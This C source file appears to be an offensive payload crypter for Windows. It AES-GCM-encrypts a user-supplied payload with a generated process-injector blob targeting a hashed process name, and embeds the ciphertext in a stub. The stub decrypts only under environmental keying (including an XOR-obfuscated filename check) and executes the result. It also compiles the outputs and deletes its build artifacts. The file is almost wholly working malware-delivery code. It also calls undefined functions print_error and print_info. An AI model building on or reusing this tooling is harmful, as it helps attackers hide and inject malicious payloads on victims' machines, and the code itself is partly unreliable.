#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <winsock2.h>
#include <Windows.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define AES_KEYLEN      32
#define GCM_IV_LEN      12
#define GCM_TAG_LEN     16
#define MAX_PATH_BUF    512

#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) fprintf(stderr, "[!] " msg "\n", ##__VA_ARGS__)

void perform_cleanup(const char* inj_bin) {
    const char* files_to_delete[] = {
        "stub.c", "stub.obj", "injector.c",
        "injector.obj", "injector.exe", inj_bin
    };

    for (int i = 0; i < sizeof(files_to_delete) / sizeof(char*); i++) {
        // remove() returns 0 on success; we ignore failures (e.g., if file doesn't exist)
        remove(files_to_delete[i]);
    }
}

bool execute_command(const char* command_line) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = 1;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // CreateProcessA requires a mutable buffer for the command line
    char* cmd_mutable = _strdup(command_line);
    if (!cmd_mutable) return false;

    if (CreateProcessA(NULL, cmd_mutable, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        fprintf(stderr, "[!] Failed to launch: %s (Error: %lu)\n", command_line, GetLastError());
    }

    free(cmd_mutable);
    return (exit_code == 0);
}

unsigned char* read_file(const char* path, int* size_out) {
    FILE* f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char* buf = malloc(size);
    if (buf) {
        fread(buf, 1, size, f);
        *size_out = (int)size;
    }

    fclose(f);
    return buf;
}


bool append_file_to_stream(const char* src_path, FILE* dest_stream) {
    FILE* src = fopen(src_path, "r");
    if (!src) return false;

    char line[4096];
    while (fgets(line, sizeof(line), src)) {
        fputs(line, dest_stream);
    }

    fclose(src);
    return true;
}

uint32_t wcharHash(const wchar_t* str) {
    uint32_t hash = 0;
    uint32_t multiplier = 31;
    while (*str != L'\0') {
        hash = hash * multiplier + *str;
        str++;
    }
    return hash;
}

unsigned char* aes_gcm_encrypt(unsigned char* key, unsigned char* plaintext, int pt_len, int* out_len) {
    EVP_CIPHER_CTX* ctx = NULL;
    int len = 0;
    int ciphertext_len = 0;
    unsigned char iv[GCM_IV_LEN];
    unsigned char tag[GCM_TAG_LEN];

    unsigned char* out = malloc(GCM_IV_LEN + pt_len + GCM_TAG_LEN);
    if (!out) return NULL;

    if (!RAND_bytes(iv, GCM_IV_LEN) || !(ctx = EVP_CIPHER_CTX_new())) {
        free(out);
        return NULL;
    }

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_LEN, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    memcpy(out, iv, GCM_IV_LEN);

    EVP_EncryptUpdate(ctx, out + GCM_IV_LEN, &len, plaintext, pt_len);
    ciphertext_len = len;

    EVP_EncryptFinal_ex(ctx, out + GCM_IV_LEN + len, &len);
    ciphertext_len += len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag);
    memcpy(out + GCM_IV_LEN + ciphertext_len, tag, GCM_TAG_LEN);

    *out_len = GCM_IV_LEN + ciphertext_len + GCM_TAG_LEN;

    EVP_CIPHER_CTX_free(ctx);
    return out;
}


void generate_injector_source(const char* bin_path, const char* proto_path, const char* target_proc) {
    info("Generating %s injector for %s", bin_path, target_proc);

    // why
    size_t size = mbstowcs(NULL, target_proc, 0);
    if (size == (size_t)-1) return;

    wchar_t* wstr = malloc((size + 1) * sizeof(wchar_t));
    mbstowcs(wstr, target_proc, size + 1);
    uint32_t proc_hash = wcharHash(wstr);
    free(wstr);

    FILE* f = fopen("injector.c", "wb");
    if (!f) return;

    fprintf(f, "#include \"injector.h\"\n\n");
    fprintf(f, "#pragma code_seg(\".inject\")\n\n");
    fprintf(f, "int injector(CONST PBYTE payload, CONST SIZE_T payloadsize) { \n\n");
    fprintf(f, "    int sProc           = %u;\n", proc_hash);

    append_file_to_stream(proto_path, f);
    fclose(f);

    info("Compiling and Linking injector...");

    if (!execute_command("cl.exe /c /GS- /O2 /Tc injector.c >NUL 2>NUL")) {
        print_error("Compiler error on injector.c");
        return;
    }

    const char* link_cmd = "link.exe /nologo /IGNORE:4108 /ENTRY:injector /NODEFAULTLIB /SUBSYSTEM:CONSOLE /FIXED /ALIGN:16 /SECTION:.inject,ER injector.obj /OUT:injector.exe";

    if (!execute_command(link_cmd)) {
        print_error("Linker error on injector.obj");
        return;
    }
}

unsigned char* build_encrypted_blob(unsigned char* key, const char* infile, const char* inj_path, int* out_len) {
    int payload_len = 0, inj_len = 0;

    unsigned char* payload = read_file(infile, &payload_len);
    unsigned char* injector = read_file(inj_path, &inj_len);

    if (!payload || !injector) {
        if (payload) free(payload);
        if (injector) free(injector);
        return NULL;
    }

    // Composite structure: [4 bytes inj_len][4 bytes pay_len][injector][payload]
    int total_len = 8 + inj_len + payload_len;
    unsigned char* composite = malloc(total_len);

    uint32_t inj_be = htonl(inj_len);
    uint32_t pay_be = htonl(payload_len);

    memcpy(composite, &inj_be, 4);
    memcpy(composite + 4, &pay_be, 4);
    memcpy(composite + 8, injector, inj_len);
    memcpy(composite + 8 + inj_len, payload, payload_len);

    info("Payload Key: ");
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) printf("%02x", key[i]);
    printf("\n");

    unsigned char* encrypted = aes_gcm_encrypt(key, composite, total_len, out_len);

    free(payload);
    free(injector);
    free(composite);
    return encrypted;
}

void generate_stub_source(unsigned char* blob, int blob_len, const char* env_template, const char* xor_fname, size_t flen) {
    FILE* f = fopen("stub.c", "w");
    if (!f) return;

    append_file_to_stream("stub_template", f);
    fprintf(f, "\n");
    append_file_to_stream(env_template, f);

    fprintf(f, "\nint main(){\n");
    fprintf(f, "    unsigned char payload[] = {");
    for (int i = 0; i < blob_len; i++) fprintf(f, "0x%02x,", blob[i]);
    fprintf(f, "};\n");

    fprintf(f, "    unsigned int payload_len = %d;\n", blob_len);
    fprintf(f, "    unsigned char key[32];\n");

    if (strstr(env_template, "filename")) {
        fprintf(f, "    char fkey[] = {");
        for (size_t i = 0; i < flen; i++) fprintf(f, " 0x%02x,", (unsigned char)xor_fname[i]);
        fprintf(f, " 0x00 };\n");
        fprintf(f, "    unsigned int fLen = %d;\n", (int)flen);
        fprintf(f, "    if (!getFileExists(key, fkey, fLen)) return 1;\n");
    }
    else {
        fprintf(f, "    if (!getKey(key)) return 1;\n");
    }

    fprintf(f, "    int pt_len = 0;\n");
    fprintf(f, "    unsigned char *pt = decrypt(key, payload, payload_len, &pt_len);\n");
    fprintf(f, "    if (!pt) return 1;\n");
    fprintf(f, "    executeComposite(pt, pt_len);\n");
    fprintf(f, "    return 0;\n}\n");

    fclose(f);
}


int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <keytype> <env_val> <inj_type> <target_proc> <infile>\n", argv[0]);
        return 1;
    }

    
    char env_tpl[MAX_PATH_BUF], inj_bin[MAX_PATH_BUF], inj_proto[MAX_PATH_BUF];
    snprintf(env_tpl, MAX_PATH_BUF, "%s_template", argv[1]);
    snprintf(inj_bin, MAX_PATH_BUF, "%s-inject.bin", argv[3]);
    snprintf(inj_proto, MAX_PATH_BUF, "%s-inject-proto", argv[3]);

    generate_injector_source(inj_bin, inj_proto, argv[4]);

    
    unsigned char key[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)argv[2], strlen(argv[2]), key);

    char xor_fname[256] = { 0 };
    size_t env_len = strlen(argv[2]);

    if (strcmp(argv[1], "filename") == 0) {
        info("WARNING: Reversing this keytype is trivial, if you care about that, use in conjunction with other types, or not at all.");
        for (size_t i = 0; i < env_len && i < 255; i++) {
            char xorkey = 'a' + (char)i;
            xor_fname[i] = argv[2][i] ^ xorkey;
        }
    }

    int blob_len = 0;
    unsigned char* encrypted_blob = build_encrypted_blob(key, argv[5], inj_bin, &blob_len);

    if (!encrypted_blob) {
        error("Encryption failed.");
        return 1;
    }

    info("Generating and compiling stub...");
    generate_stub_source(encrypted_blob, blob_len, env_tpl, xor_fname, env_len);

    
    
    const char* compile_stub = "cl.exe /nologo /MT stub.c /I \"C:\\Program Files\\OpenSSL-Win64\\include\" /link /LIBPATH:\"C:\\Program Files\\OpenSSL-Win64\\lib\\VC\\x64\\MT\" libcrypto_static.lib libssl_static.lib advapi32.lib user32.lib crypt32.lib ws2_32.lib gdi32.lib >NUL 2>NUL";

    if (execute_command(compile_stub)) {
        print_info("Stub compiled successfully.");
    }
    else {
        print_error("Stub compilation failed.");
    }
    
    free(encrypted_blob);
	perform_cleanup(inj_bin);
    info("Done!");

    return 0;
}